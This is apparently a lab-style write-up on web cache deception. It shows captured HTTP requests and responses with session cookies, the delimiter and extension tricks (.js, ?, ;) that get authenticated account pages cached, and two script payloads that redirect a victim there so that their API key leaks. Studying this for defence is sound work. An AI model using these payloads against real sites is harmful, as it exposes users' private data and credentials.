# Web Cache Deception Attack

## Introduction

Web Cache Deception is an attack that exploits caching mechanisms to trick a server into caching sensitive user data. This can lead to information disclosure vulnerabilities where an attacker can retrieve private user data simply by accessing a cached version of a page.

---

## Exploiting Web Cache Deception

### Step 1: Logging in and Observing Requests

We log in using an account and observe the following request:

```http
GET /my-account/1234 HTTP/2
Host: 0a1e005a04b1143f80300d6a003100aa.example.net
Cookie: session=UTrFHFvfXIZOaxkPWQmp46U3SvVEipxF
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1e005a04b1143f80300d6a003100aa.example.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```

If we access `/my-account/1234`, the application correctly authenticates the request and returns private user data, such as an API key.

### Step 2: Manipulating the Request to Exploit Web Cache

By appending `.js` to the request, we attempt to manipulate the cache behavior:

```http
GET /my-account/1234.js HTTP/2
Host: 0a1e005a04b1143f80300d6a003100aa.example.net
Cookie: session=UTrFHFvfXIZOaxkPWQmp46U3SvVEipxF
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1e005a04b1143f80300d6a003100aa.example.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```

If the server treats this as a static file and caches it, an attacker can access `/my-account/1234.js` without authentication and retrieve sensitive information.

### Step 3: Crafting an Exploit

We develop the following exploit to trick a victim into accessing the cached response:

```html
<script>
    document.location="https://0a1e005a04b1143f80300d6a003100aa.example.net/my-account/1234.js";
</script>
```

When a victim accesses this URL, their session data, including their API key, may be leaked if the cache is publicly accessible.

---

## Exploiting Path Delimiters for Web Cache Deception

### Step 1: Identifying Cache Mechanisms

We log in and monitor the requests. We observe:

```http
GET /resources/js/tracking.js HTTP/2
Host: 0af900b203baa50a8041f8e5009b005f.example.net
Cookie: session=NVu3BztMwvMVuLhcwBF26NjaiJNh7aOR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af900b203baa50a8041f8e5009b005f.example.net/my-account
Sec-Fetch-Dest: script
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Dnt: 1
Sec-Gpc: 1
Te: trailers
```

The response headers confirm caching:

```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=3600
X-Frame-Options: SAMEORIGIN
Server: Apache-Coyote/1.1
Age: 0
X-Cache: miss
Content-Length: 70

document.write('<img src="/resources/images/tracker.gif?page=post">');
```

### Step 2: Manipulating Path Parameters

If we add `123` to `/my-account`, we get a 404 error:

```http
GET /my-account/123 HTTP/2
Host: 0af900b203baa50a8041f8e5009b005f.example.net
Cookie: session=NVu3BztMwvMVuLhcwBF26NjaiJNh7aOR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af900b203baa50a8041f8e5009b005f.example.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```

Using a delimiter such as `?` or `;`, we bypass the 404 error:

```http
GET /my-account?123.js HTTP/2
Host: 0af900b203baa50a8041f8e5009b005f.example.net
Cookie: session=NVu3BztMwvMVuLhcwBF26NjaiJNh7aOR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af900b203baa50a8041f8e5009b005f.example.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

### Step 3: Crafting the Exploit

```html
<script>document.location="https://0af900b203baa50a8041f8e5009b005f.example.net/my-account;123.js";</script>
```

This forces the victim’s browser to access the cached page, leaking their sensitive data.

---

## Conclusion

Web Cache Deception exploits caching mechanisms to expose sensitive user data. It is critical to implement proper cache controls and restrict caching of authenticated content.
